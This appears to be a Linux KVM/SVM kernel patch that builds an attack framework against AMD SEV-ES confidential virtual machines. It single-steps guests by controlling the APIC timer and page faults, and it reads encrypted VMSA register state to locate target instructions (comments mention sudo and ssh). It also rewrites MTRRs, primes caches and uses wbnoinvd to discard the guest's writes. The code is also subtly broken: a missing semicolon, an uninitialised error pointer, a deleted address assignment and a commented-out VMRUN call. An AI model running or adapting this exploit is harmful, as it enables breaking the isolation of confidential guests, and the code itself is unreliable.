@@ -1,0 +1,960 @@
+diff --git a/arch/x86/include/asm/kvm_host.h b/arch/x86/include/asm/kvm_host.h
+index f05ebaa26f0f..c5f47079fb72 100644
+--- a/arch/x86/include/asm/kvm_host.h
++++ b/arch/x86/include/asm/kvm_host.h
+@@ -1743,6 +1743,9 @@ void kvm_mmu_zap_collapsible_sptes(struct kvm *kvm,
+ void kvm_mmu_slot_leaf_clear_dirty(struct kvm *kvm,
+ 				   const struct kvm_memory_slot *memslot);
+ void kvm_mmu_zap_all(struct kvm *kvm);
++bool kvm_unpre_all(struct kvm *kvm, u32 asid);
++bool kvm_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid);
++bool kvm_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid);
+ void kvm_mmu_invalidate_mmio_sptes(struct kvm *kvm, u64 gen);
+ void kvm_mmu_change_mmu_pages(struct kvm *kvm, unsigned long kvm_nr_mmu_pages);
+ 
+diff --git a/arch/x86/kvm/mmu/mmu.c b/arch/x86/kvm/mmu/mmu.c
+index b6f96d47e596..d6b1efc78fb9 100644
+--- a/arch/x86/kvm/mmu/mmu.c
++++ b/arch/x86/kvm/mmu/mmu.c
+@@ -1538,6 +1538,39 @@ bool kvm_unmap_gfn_range(struct kvm *kvm, struct kvm_gfn_range *range)
+ 	return flush;
+ }
+ 
++bool kvm_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid)
++{
++	bool flush = false;
++
++	if (is_tdp_mmu_enabled(kvm))
++		flush = kvm_tdp_mmu_unpre_gfn(kvm, gfn, asid, flush);
++
++	return flush;
++}
++EXPORT_SYMBOL_GPL(kvm_unpre_gfn);
++
++bool kvm_unpre_all(struct kvm *kvm, u32 asid)
++{
++	bool flush = false;
++
++	if (is_tdp_mmu_enabled(kvm))
++		flush = kvm_tdp_mmu_unpre_all(kvm, asid, flush);
++
++	return flush;
++}
++EXPORT_SYMBOL_GPL(kvm_unpre_all);
++
++bool kvm_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid)
++{
++	bool flush = false;
++
++	if (is_tdp_mmu_enabled(kvm))
++		flush = kvm_tdp_mmu_unpre_all_except_gfn(kvm, gfn, asid, flush);
++
++	return flush;
++}
++EXPORT_SYMBOL_GPL(kvm_unpre_all_except_gfn);
++
+ bool kvm_set_spte_gfn(struct kvm *kvm, struct kvm_gfn_range *range)
+ {
+ 	bool flush = false;
+diff --git a/arch/x86/kvm/mmu/tdp_mmu.c b/arch/x86/kvm/mmu/tdp_mmu.c
+index 672f0432d777..57b662122005 100644
+--- a/arch/x86/kvm/mmu/tdp_mmu.c
++++ b/arch/x86/kvm/mmu/tdp_mmu.c
+@@ -976,6 +976,41 @@ static bool tdp_mmu_zap_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
+ 	return flush;
+ }
+ 
++static bool tdp_mmu_zap_exec_leafs(struct kvm *kvm, struct kvm_mmu_page *root,
++			      gfn_t start, gfn_t end, bool can_yield, bool flush)
++{
++	struct tdp_iter iter;
++
++	end = min(end, tdp_mmu_max_gfn_exclusive());
++
++	lockdep_assert_held_write(&kvm->mmu_lock);
++
++	rcu_read_lock();
++
++	for_each_tdp_pte_min_level(iter, root, PG_LEVEL_4K, start, end) {
++		if (can_yield &&
++		    tdp_mmu_iter_cond_resched(kvm, &iter, flush, false)) {
++			flush = false;
++			continue;
++		}
++
++		if (!is_shadow_present_pte(iter.old_spte) ||
++		    !is_last_spte(iter.old_spte, iter.level))
++			continue;
++
++		tdp_mmu_set_spte(kvm, &iter, (iter.old_spte & 0xfffffffffffff7fe));
++		flush = true;
++	}
++
++	rcu_read_unlock();
++
++	/*
++	 * Because this flow zaps _only_ leaf SPTEs, the caller doesn't need
++	 * to provide RCU protection as no 'struct kvm_mmu_page' will be freed.
++	 */
++	return flush;
++}
++
+ /*
+  * Zap leaf SPTEs for the range of gfns, [start, end), for all roots. Returns
+  * true if a TLB flush is needed before releasing the MMU lock, i.e. if one or
+@@ -992,6 +1027,17 @@ bool kvm_tdp_mmu_zap_leafs(struct kvm *kvm, int as_id, gfn_t start, gfn_t end,
+ 	return flush;
+ }
+ 
++bool kvm_tdp_mmu_zap_exec_leafs(struct kvm *kvm, int as_id, gfn_t start, gfn_t end,
++			   bool can_yield, bool flush)
++{
++	struct kvm_mmu_page *root;
++
++	for_each_tdp_mmu_root_yield_safe(kvm, root, as_id)
++		flush = tdp_mmu_zap_exec_leafs(kvm, root, start, end, can_yield, flush);
++
++	return flush;
++}
++
+ void kvm_tdp_mmu_zap_all(struct kvm *kvm)
+ {
+ 	struct kvm_mmu_page *root;
+@@ -1234,6 +1280,25 @@ bool kvm_tdp_mmu_unmap_gfn_range(struct kvm *kvm, struct kvm_gfn_range *range,
+ 					 range->end, range->may_block, flush);
+ }
+ 
++bool kvm_tdp_mmu_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush)
++{
++	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, gfn, gfn+1, false, flush);
++	return true;
++}
++
++bool kvm_tdp_mmu_unpre_all(struct kvm *kvm, u32 asid, bool flush)
++{
++	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, 0, tdp_mmu_max_gfn_exclusive(), false, flush);
++	return true;
++}
++
++bool kvm_tdp_mmu_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush)
++{
++	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, 0, gfn, false, flush);
++	kvm_tdp_mmu_zap_exec_leafs(kvm, 0, gfn+1, tdp_mmu_max_gfn_exclusive(), false, flush);
++	return true;
++}
++
+ typedef bool (*tdp_handler_t)(struct kvm *kvm, struct tdp_iter *iter,
+ 				  struct kvm_gfn_range *range);
+ 
+diff --git a/arch/x86/kvm/mmu/tdp_mmu.h b/arch/x86/kvm/mmu/tdp_mmu.h
+index c163f7cc23ca..84f7d6fd6afc 100644
+--- a/arch/x86/kvm/mmu/tdp_mmu.h
++++ b/arch/x86/kvm/mmu/tdp_mmu.h
+@@ -15,8 +15,12 @@ __must_check static inline bool kvm_tdp_mmu_get_root(struct kvm_mmu_page *root)
+ void kvm_tdp_mmu_put_root(struct kvm *kvm, struct kvm_mmu_page *root,
+ 			  bool shared);
+ 
++bool kvm_tdp_mmu_unpre_leafs(struct kvm *kvm, int as_id, gfn_t start,
++				 gfn_t end, bool can_yield, bool flush);
+ bool kvm_tdp_mmu_zap_leafs(struct kvm *kvm, int as_id, gfn_t start,
+ 				 gfn_t end, bool can_yield, bool flush);
++bool kvm_tdp_mmu_zap_exec_leafs(struct kvm *kvm, int as_id, gfn_t start,
++				 gfn_t end, bool can_yield, bool flush);
+ bool kvm_tdp_mmu_zap_sp(struct kvm *kvm, struct kvm_mmu_page *sp);
+ void kvm_tdp_mmu_zap_all(struct kvm *kvm);
+ void kvm_tdp_mmu_invalidate_all_roots(struct kvm *kvm);
+@@ -26,6 +30,9 @@ int kvm_tdp_mmu_map(struct kvm_vcpu *vcpu, struct kvm_page_fault *fault);
+ 
+ bool kvm_tdp_mmu_unmap_gfn_range(struct kvm *kvm, struct kvm_gfn_range *range,
+ 				 bool flush);
++bool kvm_tdp_mmu_unpre_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush);
++bool kvm_tdp_mmu_unpre_all(struct kvm *kvm, u32 asid, bool flush);
++bool kvm_tdp_mmu_unpre_all_except_gfn(struct kvm *kvm, gfn_t gfn, u32 asid, bool flush);
+ bool kvm_tdp_mmu_age_gfn_range(struct kvm *kvm, struct kvm_gfn_range *range);
+ bool kvm_tdp_mmu_test_age_gfn(struct kvm *kvm, struct kvm_gfn_range *range);
+ bool kvm_tdp_mmu_set_spte_gfn(struct kvm *kvm, struct kvm_gfn_range *range);
+diff --git a/arch/x86/kvm/svm/sev.c b/arch/x86/kvm/svm/sev.c
+index efaaef2b7ae1..2af73fafe5bf 100644
+--- a/arch/x86/kvm/svm/sev.c
++++ b/arch/x86/kvm/svm/sev.c
+@@ -784,7 +784,7 @@ static int __sev_issue_dbg_cmd(struct kvm *kvm, unsigned long src,
+ 				 &data, error);
+ }
+ 
+-static int __sev_dbg_decrypt(struct kvm *kvm, unsigned long src_paddr,
++int __sev_dbg_decrypt(struct kvm *kvm, unsigned long src_paddr,
+ 				 unsigned long dst_paddr, int sz, int *err)
+ {
+ 	int offset;
+@@ -933,7 +933,6 @@ static int sev_dbg_crypt(struct kvm *kvm, struct kvm_sev_cmd *argp, bool dec)
+ 	if (!debug.dst_uaddr)
+ 		return -EINVAL;
+ 
+-	vaddr = debug.src_uaddr;
+ 	size = debug.len;
+ 	vaddr_end = vaddr + size;
+ 	dst_vaddr = debug.dst_uaddr;
+diff --git a/arch/x86/kvm/svm/svm.c b/arch/x86/kvm/svm/svm.c
+index ce362e88a567..9cfe67afde29 100644
+--- a/arch/x86/kvm/svm/svm.c
++++ b/arch/x86/kvm/svm/svm.c
+@@ -9,6 +9,7 @@
+ #include "cpuid.h"
+ #include "pmu.h"
+ 
++#include <linux/mm.h>
+ #include <linux/module.h>
+ #include <linux/mod_devicetable.h>
+ #include <linux/kernel.h>
+@@ -16,6 +17,7 @@
+ #include <linux/highmem.h>
+ #include <linux/amd-iommu.h>
+ #include <linux/sched.h>
++#include <linux/io.h>
+ #include <linux/trace_events.h>
+ #include <linux/slab.h>
+ #include <linux/hashtable.h>
+@@ -38,6 +40,7 @@
+ #include <asm/cpu_device_id.h>
+ #include <asm/traps.h>
+ #include <asm/fpu/api.h>
++#include <asm/tlbflush.h>
+ 
+ #include <asm/virtext.h>
+ #include "trace.h"
+@@ -258,6 +261,60 @@ static int tsc_aux_uret_slot __read_mostly = -1;
+ 
+ static const u32 msrpm_ranges[] = {0, 0xc0000000, 0xc0010000};
+ 
++/* Interrupt Framework */
++#define SEV_STEP_FLAG_BASE_PFN 0x1FEE01
++
++static void* vmsa_vaddr;
++static void* sev_step_page_va;
++
++static u16 zero_stepping_time = 0;
++static u32 non_zero_stepping_time = 0;
++static u32 apic_interval = 0;
++static u64 last_vmsa_rip = 0;
++
++#define PATH_OFFSET 16 
++static bool find_target = true;
++static bool allow_invd = false;
++static bool start_counting = false;
++static u64 last_npf_gfn = 0;
++
++static u16 path_index = 0;
++static u16 instr_counter = 0;
++static u64 step_runtime = 0;
++
++/* VMSA REG_BLOCK */
++static u64 last_vmsa_rsp = 0; // 1d8h
++static u64 last_vmsa_rax = 0; // 1f8h
++static u64 last_vmsa_rcx = 0; // 308h
++static u64 last_vmsa_rdx_rbx = 0; // 310h
++static u64 last_vmsa_rbp = 0; // 328h
++static u64 last_vmsa_rsi_rdi = 0; // 330h
++static u64 last_vmsa_r8_r9 = 0; // 340h
++static u64 last_vmsa_r10_r11 = 0; // 350h
++static u64 last_vmsa_r12_r13 = 0; // 360h
++static u64 last_vmsa_r14_r15 = 0; // 370h
++
++/* INCOMPLETE */
++static u64 last_vmsa_xmm = 0; // 470h
++static u64 last_vmsa_ymm = 0; // 570h
++static u64 last_vmsa_cs = 0; // 10h
++static u64 last_vmsa_ss = 0; // 20h
++
++static u16 last_reg_vector = 0;
++static u16 cur_invd_idx = 0;
++
++/* MEMORY - FOR NPF */
++// static u64 read_mem  = 0;
++// static u64 write_mem = 0;
++
++struct page *tpage = NULL;
++static void *dst_vaddr;
++static u64 dst_paddr = 0;
++static u64 vmsa_paddr = 0;
++static u64 npf_gfn = 0;
++
++static void *evict_buffer[20];
++
+
+@@ -1355,6 +1412,19 @@ static int svm_vcpu_create(struct kvm_vcpu *vcpu)
+ 	struct page *vmsa_page = NULL;
+ 	int err;
+ 
++	tpage = (void *)alloc_page(GFP_KERNEL | __GFP_ZERO);
++	if (!tpage)
++		return -ENOMEM;
++	for (int i = 0; i < 20; i++) {
++		evict_buffer[i] = (void *)__get_free_pages(GFP_KERNEL | __GFP_ZERO | __GFP_COMP, 9);
++		if (!evict_buffer[i])
++			return -ENOMEM;
++		printk("evict_buffer_%d: %lx\n", i, __pa(evict_buffer[i]));
++	}
++	dst_vaddr = vmap(&tpage, 1, 0, PAGE_KERNEL);
++	dst_paddr = __sme_page_pa(tpage);
++	sev_step_page_va = kmap_local_pfn(SEV_STEP_FLAG_BASE_PFN);
++
+ 	BUILD_BUG_ON(offsetof(struct vcpu_svm, vcpu) != 0);
+ 	svm = to_svm(vcpu);
+ 
+@@ -1397,8 +1467,10 @@ static int svm_vcpu_create(struct kvm_vcpu *vcpu)
+ 	svm->vmcb01.pa = __sme_set(page_to_pfn(vmcb01_page) << PAGE_SHIFT);
+ 	svm_switch_vmcb(svm, &svm->vmcb01);
+ 
+-	if (vmsa_page)
++	if (vmsa_page) {
+ 		svm->sev_es.vmsa = page_address(vmsa_page);
++		vmsa_paddr = svm->vmcb->control.vmsa_pa;
++	}
+ 
+ 	svm->guest_state_loaded = false;
+ 
+@@ -1437,6 +1509,18 @@ static void svm_vcpu_free(struct kvm_vcpu *vcpu)
+ 
+ 	sev_free_vcpu(vcpu);
+ 
++	if (tpage) {
++		vunmap(dst_vaddr);
++		__free_page(tpage);
++	}
++	for (int i = 0; i < 20; i++)
++	{
++		if (evict_buffer[i]) {
++			free_pages((unsigned long)evict_buffer[i], 9);
++		}
++	}
++	kunmap_local(sev_step_page_va);
++
+ 	__free_page(pfn_to_page(__sme_clr(svm->vmcb01.pa) >> PAGE_SHIFT));
+ 	__free_pages(virt_to_page(svm->msrpm), get_order(MSRPM_SIZE));
+ }
+
+@@ -1966,8 +2050,45 @@ static int npf_interception(struct kvm_vcpu *vcpu)
+ 
+ 	u64 fault_address = svm->vmcb->control.exit_info_2;
+ 	u64 error_code = svm->vmcb->control.exit_info_1;
++	u64 flag = *((volatile u64 *)(sev_step_page_va));
++	u8 page_guide = (flag >> 13) & 0x1;
++	u8 page_verbose = (flag >> 14) & 0x1;
+ 
+ 	trace_kvm_page_fault(vcpu, fault_address, error_code);
++
++	if ((error_code & PFERR_FETCH_MASK) && ((flag & 0xff) == 0x77)) {
++
++		npf_gfn = fault_address >> PAGE_SHIFT;
++
++		/* Fetch New Page. Reset state */
++		if (npf_gfn != last_npf_gfn) {
++			path_index = 0;
++			/* reset */
++			find_target = true;
++			if (page_verbose) {
++				printk("Fetch NPF at 0x%llx last NPF at 0x%llx APIC: 0x%x\n", fault_address, last_npf_gfn, apic_interval);
++			}
++
++			last_npf_gfn = npf_gfn;
++		}
++
++		if (allow_invd) {
++			apic_interval = ((flag >> 16) & 0xffff);
++		}
++		else if (start_counting || find_target) {
++			apic_interval = ((flag >> 16) & 0xffff);
++		}
++		else if (page_guide && (fault_address == *((volatile u64 *)(sev_step_page_va+1024)))) {
++			apic_interval = ((flag >> 16) & 0xffff);
++		}
++		else {
++			apic_interval = 0xffffff; /* next npf */
++			/* Then should be next NPF but not INTR */
++			kvm_unpre_all_except_gfn(vcpu->kvm, npf_gfn, svm->vmcb->control.asid);
++			svm_flush_tlb_current(vcpu);
++		}
++	}
++
+ 	return kvm_mmu_page_fault(vcpu, fault_address, error_code,
+ 			static_cpu_has(X86_FEATURE_DECODEASSISTS) ?
+ 			svm->vmcb->control.insn_bytes : NULL,
+@@ -2152,12 +2273,329 @@ static int nmi_interception(struct kvm_vcpu *vcpu)
+ }
+ 
+ static int smi_interception(struct kvm_vcpu *vcpu)
+-{
++{	
+ 	return 1;
+ }
+ 
++void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }
++
++u64 rdpru_a(void) {
++	u64 a, d;
++	asm volatile("mfence");
++	asm volatile(".byte 0x0f,0x01,0xfd" : "=a"(a), "=d"(d) : "c"(1) : );
++	a = (d << 32) | a;
++	asm volatile("mfence");
++	return a;
++}
++
++void mtrr_uc_page(u64 base, u8 num) {
++	u32 low = (u32)base | 0x00; // UC
++	u32 high = (base >> 32) & 0x7fff;
++	asm volatile("wrmsr\n" : : "c"(0x208+num*2), "a"(low), "d"(high));  // Base
++	asm volatile("wrmsr\n" : : "c"(0x209+num*2), "a"(0xfffff800), "d"(0xffff)); // Mask 4KB
++}
++
++void mtrr_wb_page(u64 base, u8 num) {
++	u32 low = (u32)base | 0x06; // WB
++	u32 high = (base >> 32) & 0x7fff;
++	asm volatile("wrmsr\n" : : "c"(0x208+num*2), "a"(low), "d"(high));  // Base
++	asm volatile("wrmsr\n" : : "c"(0x209+num*2), "a"(0xfffff800), "d"(0xffff)); // Mask 4KB
++}
++
++
++#define C 1
++#define D 1
++#define L 1
++#define S 32 / 16
++
++// L3 16384 sets
++void __attribute__((aligned(0x1000))) prime_l3_set(void* addr){
++  for (int s = 0; s < S-D ; s+=L ){
++	for(int c = 0; c < C; c++) {
++	  for(int d = 0; d < D; d++) {
++		  maccess(addr+((s+d) << 20));
++	  }
++	}
++  }
++}
++
+ static int intr_interception(struct kvm_vcpu *vcpu)
+ {
++	u64 flag = *((volatile u64 *)(sev_step_page_va));
++	u8 sw = flag & 0xff; // Magic value
++
++	struct vcpu_svm *svm = to_svm(vcpu);
++	
++	/*
++	 *  Interrupt Hook
++	 */
++	if (sw == 0x77) {
++		u64 rip, rsp, rax, rcx, rdx_rbx, rbp, rsi_rdi;
++		u64 r8_r9, r10_r11, r12_r13, r14_r15, xmm, ymm, cs, ss;
++
++		u8 dec 		= (flag >> 8)  & 0x1; /* Decrypt VMSA. Only Debug Mode */
++		u8 uc_vmsa 	= (flag >> 9)  & 0x1; /* Uncacheable VMSA */
++		u8 invd 	= (flag >> 10) & 0x1; /* Perform INVD or not*/
++		u8 no_ob 	= (flag >> 11) & 0x1; /* Do not observe VMSA */
++		u8 vec_seq 	= (flag >> 12) & 0x1; /* Provide a register change sequence for guiding location */
++		// u8 page_guide = (flag >> 13) & 0x1;
++		u8 page_verbose  = (flag >> 14) & 0x1; /* Page Trace */
++		u8 instr_verbose = (flag >> 15) & 0x1; /* Instruction Trace */
++
++		u32 additional_flag = *((volatile u32 *)(sev_step_page_va+3096));
++		u8 runtime = (additional_flag >> 2) & 0x1; /* Measure the timing of stepping */
++		u8 zero_step_tlb_flush = (additional_flag >> 3) & 0x1; /* Flush TLB even after zero-stepping */
++															   /* Slower, but improve stable single-stepping a bit */
++															   /* Otherwise you'll observe multi-step sometimes */
++
++		u16 reg_vector = 0; /* The register change between two steps */
++		u16 path_size = 0;  /* The length of the guidance sequence */
++		u64 vmsa_paddr = svm->vmcb->control.vmsa_pa;
++		
++		/* Start */
++		if (zero_stepping_time == 0 && non_zero_stepping_time == 0) {
++			kvm_unpre_all(vcpu->kvm, svm->vmcb->control.asid);
++			svm_flush_tlb_current(vcpu);
++
++			/* Mark VMSA into UC will make `VMRUN` updates all vmsa state in cache */
++			if (uc_vmsa) {
++				mtrr_uc_page(vmsa_paddr, 3);
++			}
++			
++			/* Avoid to drop smth dirty data and freeze the system
++			 * wbnoinvd is enough to make it reliable
++			 * wbinvd also works, but it takes longer time
++			 */
++			if (invd) {
++				asm volatile ("wbnoinvd\n\t");
++			}
++		}
++
++		/* Do not observe VMSA */
++		if (no_ob) {
++			if (!vmsa_vaddr)
++				vmsa_vaddr = phys_to_virt(vmsa_paddr);
++			non_zero_stepping_time++;
++			if (runtime)
++				printk("Time(no_ob): %lld\n", step_runtime);
++
++			/* Unpre the current instruction page*/
++			if (npf_gfn) {
++				if (page_verbose)
++					kvm_unpre_all(vcpu->kvm, svm->vmcb->control.asid);
++				else
++					kvm_unpre_gfn(vcpu->kvm, npf_gfn, svm->asid);
++				svm_flush_tlb_current(vcpu);
++			}
++		}
++		/* Do stepping */
++		else {
++			if (!vmsa_vaddr)
++				vmsa_vaddr = phys_to_virt(vmsa_paddr);
++
++			asm volatile ("wbnoinvd\n\t");
++			/* Read the ciphertext */
++			if (!dec) {
++				/* rIP offset is 0x178 in VMSA */
++				rip = *(volatile u64 *)(vmsa_vaddr+0x178);
++			}
++			else {
++				int *err;
++				/* The minimal block size is 16 */
++				__sev_dbg_decrypt(vcpu->kvm, __sme_set(vmsa_paddr+0x170), __sme_set(dst_paddr+0x170), 16, err);
++				rip = *((volatile u64 *)((u64)dst_vaddr+0x178));
++			}
++
++			/* Zero-stepping */
++			if (last_vmsa_rip == rip) {
++				zero_stepping_time++;
++				if (runtime)
++					printk("Time(zero): %lld\n", step_runtime);
++				
++				/* Figure 6 */
++				if (instr_verbose) {
++					printk("zero-step\n");
++				}
++
++				/* zero_step_tlb_flush improve the reliablity of single-step but prob slow the speed */
++				if (zero_step_tlb_flush) {
++					kvm_unpre_gfn(vcpu->kvm, npf_gfn, svm->asid);
++					svm_flush_tlb_current(vcpu);
++				}
++			}
++			else {
++				/* Single/Multi-stepping */
++				if (dec) {
++					printk("rIP: 0x%llx\t last rIP: 0x%llx\n", rip, last_vmsa_rip);
++				}
++				if (runtime)
++					printk("Time(non_zero): %lld\n", step_runtime);
++
++				last_vmsa_rip = rip;
++				non_zero_stepping_time++;
++
++				/* Target Localtion (for sudo || ssh || bench)
++				 * Use the reg change pattern
++				 */ 
++				if (vec_seq) {
++
++					path_size = *((volatile u16 *)(sev_step_page_va+PATH_OFFSET));
++					path_index++;
++
++					rsp = *(volatile u64 *)(vmsa_vaddr+0x1d8);
++					rbp = *(volatile u64 *)(vmsa_vaddr+0x328);
++					rax = *(volatile u64 *)(vmsa_vaddr+0x1f8);
++					rcx = *(volatile u64 *)(vmsa_vaddr+0x308);
++					rdx_rbx = *(volatile u64 *)(vmsa_vaddr+0x310);
++					rsi_rdi = *(volatile u64 *)(vmsa_vaddr+0x330);
++					r8_r9   = *(volatile u64 *)(vmsa_vaddr+0x340);
++					r10_r11 = *(volatile u64 *)(vmsa_vaddr+0x350);
++					r12_r13 = *(volatile u64 *)(vmsa_vaddr+0x360);
++					r14_r15 = *(volatile u64 *)(vmsa_vaddr+0x370);
++					xmm = *(volatile u64 *)(vmsa_vaddr+0x470);
++					ymm = *(volatile u64 *)(vmsa_vaddr+0x570);
++					cs  = *(volatile u64 *)(vmsa_vaddr+0x10);
++					ss  = *(volatile u64 *)(vmsa_vaddr+0x20);
++
++					reg_vector = ((last_vmsa_rsp != rsp) << 0) + ((last_vmsa_rbp != rbp) << 1) + \
++						((last_vmsa_rax != rax) << 2) 		   + ((last_vmsa_rcx != rcx) << 3) + \
++						((last_vmsa_rdx_rbx != rdx_rbx) << 4)  + ((last_vmsa_rsi_rdi != rsi_rdi) << 5) + \
++						((last_vmsa_r8_r9 != r8_r9) << 6) 	   + ((last_vmsa_r10_r11 != r10_r11) << 7) + \
++						((last_vmsa_r12_r13 != r12_r13) << 8)  + ((last_vmsa_r14_r15 != r14_r15) << 9) + \
++						((last_vmsa_xmm != xmm) << 10) 		   + ((last_vmsa_ymm != ymm) << 11) + \
++						((last_vmsa_cs != cs) << 12) 		   + ((last_vmsa_ss != ss) << 13);
++					
++					last_vmsa_rsp = rsp;
++					last_vmsa_rbp = rbp
++					last_vmsa_rax = rax;
++					last_vmsa_rcx = rcx;
++					last_vmsa_rdx_rbx = rdx_rbx;
++					last_vmsa_rbp 	  = rbp;
++					last_vmsa_rsi_rdi = rsi_rdi;
++					last_vmsa_r8_r9   = r8_r9;
++					last_vmsa_r10_r11 = r10_r11;
++					last_vmsa_r12_r13 = r12_r13;
++					last_vmsa_r14_r15 = r14_r15;
++					last_vmsa_xmm = xmm;
++					last_vmsa_ymm = ymm;
++					last_vmsa_cs  = cs;
++					last_vmsa_ss  = ss;
++
++					/* Do not step within a page if the seq does not match 
++					 * Then need to ignore index[1] (cuz its not real reg usage of a single-step) 
++					 */
++					if (path_index == 1)
++						find_target = true;
++					else if (reg_vector != *((volatile u16 *)(sev_step_page_va + PATH_OFFSET + path_index*2))) {
++						find_target = false;
++						// printk("dismatch %dth Instr! the vector is 0x%x\n", path_index, reg_vector);
++					}
++					
++					if (instr_verbose)
++						printk("%dth Instr. reg_vector: 0x%x\n", path_index, reg_vector);
++						// printk("[%d] npf_gfn:%llx: %dth Instr. reg_vector: 0x%x apic_timer: 0x%x\n", find_target, npf_gfn, path_index, reg_vector, apic_interval);
++
++					if ((path_index == path_size) && find_target) {
++						printk("Find Target!!! npf_gfn: %llx; %dth instruction\n", npf_gfn, path_index);
++						
++						/* Start counting 
++						 * A counter guide how many single-steps to the real target
++						 */
++						start_counting = true;
++						instr_counter = 0;
++					}
++					
++					/* Have found a unique pattern, then counter the number of instruction
++					 * Precise single-stepping is required here
++					 */
++					if (start_counting) {
++						instr_counter++;
++
++						/* After pattern match, how many instructions are we far from the target writes  */
++						if (instr_counter == *((volatile u16 *)(sev_step_page_va+2048)) ) {
++							start_counting = false;
++							instr_counter = 0;
++							/* second pattern: the reg usage of the last second instruction before the target write */
++							if (last_reg_vector == *((volatile u16 *)(sev_step_page_va+2050))) {
++
++								/* third pattern: the reg usage of the last instruction before the target write */
++								if (reg_vector == *((volatile u16 *)(sev_step_page_va+2054))) {
++									allow_invd = true;
++			
++									/* Move MTRR things here before next stepping that drop target 
++									 * Cannot do this in next stepping cuz seems it flush the cache, then our target writes got written back
++									 */
++									mtrr_wb_page(vmsa_paddr, 3);
++									asm volatile("wbnoinvd\n");
++								}
++								else {
++									allow_invd = false;
++									printk("1st instr before target dismatch: %x\n", reg_vector);
++								}
++							}
++							else {
++								allow_invd = false;
++								printk("2nd instr before target dismatch: %x\n", last_reg_vector);
++							}
++						}
++
++						/* Let NPF handler set the interval */
++						kvm_unpre_all(vcpu->kvm, svm->vmcb->control.asid);
++						svm_flush_tlb_current(vcpu);
++					}
++					else {
++						kvm_unpre_gfn(vcpu->kvm, npf_gfn, svm->asid);
++						svm_flush_tlb_current(vcpu);
++					}
++					
++					last_reg_vector = reg_vector;
++					/* Set apic_interval here so that the next INT is always NPF?? */
++					apic_interval = 0xffffff;
++				}
++			}
++		}
++
++		/* Finish */
++		if (non_zero_stepping_time == (flag >> 32)) {
++			zero_stepping_time = 0;
++			non_zero_stepping_time = 0;
++			
++			/* Mark VMSA write-back */
++			if (uc_vmsa) 
++				mtrr_wb_page(vmsa_paddr, 3);
++
++			/* Stop the hook */
++			*((volatile u64 *)(sev_step_page_va)) = 0;
++
++			/* Do not overwirte the APIC Timer next time */
++			apic_interval = 0;
++
++			/* Clean NPF_GFN */
++			npf_gfn = 0;
++
++			if (vmsa_vaddr) {
++				vmsa_vaddr = NULL;
++			}
++		}
++
++		++vcpu->stat.irq_exits;
++		return 1;
++	}
++	else {
++		/* Should remove smth. Here's just a safe choice */
++		zero_stepping_time = 0;
++		non_zero_stepping_time = 0;
++		npf_gfn = 0;
++		apic_interval = 0;
++		instr_counter = 0;
++		last_reg_vector = 0;
++		cur_invd_idx = 0;
++		start_counting = false;
++		if (vmsa_vaddr) {
++			vmsa_vaddr = NULL;
++		}
++	}
++
+ 	++vcpu->stat.irq_exits;
+ 	return 1;
+ }
+ 
+@@ -3532,17 +3971,26 @@ void svm_complete_interrupt_delivery(struct kvm_vcpu *vcpu, int delivery_mode,
+ static void svm_deliver_interrupt(struct kvm_lapic *apic,  int delivery_mode,
+ 				  int trig_mode, int vector)
+ {
+-	kvm_lapic_set_irr(vector, apic);
+-
+-	/*
+-	 * Pairs with the smp_mb_*() after setting vcpu->guest_mode in
+-	 * vcpu_enter_guest() to ensure the write to the vIRR is ordered before
+-	 * the read of guest_mode.  This guarantees that either VMRUN will see
+-	 * and process the new vIRR entry, or that svm_complete_interrupt_delivery
+-	 * will signal the doorbell if the CPU has already entered the guest.
++	/* SEV_STEP  
++	 *
++	 * Filter the APIC Timer interrupt sent to the Guest
+ 	 */
+-	smp_mb__after_atomic();
+-	svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
++	u8 flag = *((volatile u8 *)(sev_step_page_va));
++	if (flag != 0x77 || vector != 0xec) {
++
++		kvm_lapic_set_irr(vector, apic);
++
++		/*
++		* Pairs with the smp_mb_*() after setting vcpu->guest_mode in
++		* vcpu_enter_guest() to ensure the write to the vIRR is ordered before
++		* the read of guest_mode.  This guarantees that either VMRUN will see
++		* and process the new vIRR entry, or that svm_complete_interrupt_delivery
++		* will signal the doorbell if the CPU has already entered the guest.
++		*/
++		
++		smp_mb__after_atomic();
++		svm_complete_interrupt_delivery(apic->vcpu, delivery_mode, trig_mode, vector);
++	}
+ }
+ 
+@@ -3899,15 +4347,139 @@ static fastpath_t svm_exit_handlers_fastpath(struct kvm_vcpu *vcpu)
+ static noinstr void svm_vcpu_enter_exit(struct kvm_vcpu *vcpu, bool spec_ctrl_intercepted)
+ {
+ 	struct vcpu_svm *svm = to_svm(vcpu);
++	u32 flag 	= *((volatile u32 *)(sev_step_page_va));
++	// u8 uc_vmsa 	= (flag >> 9)  & 0x1;
++	u8 invd 	= (flag >> 10) & 0x1;
++	u8 vec_seq 	= (flag >> 12) & 0x1;
++	u16 invd_idx = *((volatile u16 *)(sev_step_page_va+2052));
++	u32 additional_flag = *((volatile u32 *)(sev_step_page_va+3096));
++	
++	/* nothing / wbinvd / wbnoinvd before VMRUN*/
++	/* Use WBINVD now */
++	u32 wbnoinvd = additional_flag & 0x1;
++	u8 runtime = (additional_flag >> 2) & 0x1;
++	// u32 time_begin, time_end;
++	u64 time_begin = 0;
++
++	/* Before resume! so its the last reason */
++	u32 exit_code;
++	// u64 error_code, fault_address;
++	
++	/* The L2 index we want to drop */
++	u64 filter_set_idx = *((volatile u64 *)(sev_step_page_va+8));
++
++	if ((flag & 0xff) != 0x77) {
++		apic_interval = 0;
++	}
+ 
+ 	guest_state_enter_irqoff();
++	
++	if (runtime)
++		time_begin = rdpru_a();
+ 
+ 	if (sev_es_guest(vcpu->kvm))
+-		__svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted);
++		// __svm_sev_es_vcpu_run(svm, spec_ctrl_intercepted);
